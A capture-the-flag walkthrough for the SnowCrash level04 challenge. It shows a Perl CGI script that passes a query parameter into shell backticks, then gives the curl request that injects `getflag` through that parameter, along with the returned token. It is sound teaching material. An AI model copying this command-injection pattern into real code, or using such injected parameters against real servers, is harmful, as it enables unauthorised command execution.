# 🧊 SnowCrash - Level04 Walkthrough

## Level: 04

**Objective:** Exploit a vulnerable `Perl CGI` script to execute `getflag` and retrieve the token.

### 🧩 Step-by-step Solution

**1. Examine the script**

The file `level04.pl` contains the following Perl code:

```bash
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

✅ The script runs a local web server on `localhost:4747`, accepts a query parameter `x`, and passes it directly to:

```bash
print `echo $y 2>&1`;
```

This is a **command injection vulnerability** via `backticks`.

**2. Test the server**

Use `curl` to send a request with an injected command:

```bash
curl 'localhost:4747/level04.pl?x=`getflag`'
```

✅ Output:

```bash
Check flag. Here is your token : ne2searoevaevoem4ov4ar8ap
```

🔍 The `backticks` allow arbitrary shell command execution. Since the script echoes whatever is passed in `x`, we can inject `getflag` and retrieve the token directly.

**🔓 Successfully moved to level05!**